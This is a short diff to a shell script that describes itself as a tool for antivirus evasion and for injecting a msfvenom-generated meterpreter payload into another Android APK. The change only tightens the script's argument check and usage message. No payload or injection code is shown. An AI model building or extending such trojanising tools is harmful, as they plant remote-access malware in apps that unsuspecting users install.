@@ -4,7 +4,7 @@
 # Purpose: AV Evasion along with injecting a meterpreter payload into another apk file
 # Date: 0% detection as of 16Feb17
 
-if [ $# -eq 0 ] || [ ${1: -4} != ".apk" ] || [ $2 -eq 0 ] || [ ${2: -4} != ".apk" ]; then
+if [ $# -lt 2 ] || [ ${1: -4} != ".apk" ] || [ ${2: -4} != ".apk" ]; then
     echo
     echo "-------------INVALID ARGUMENT------------"
     echo "Please pass in a msfvenom generated .apk file followed by the .apk you want to inject it into"
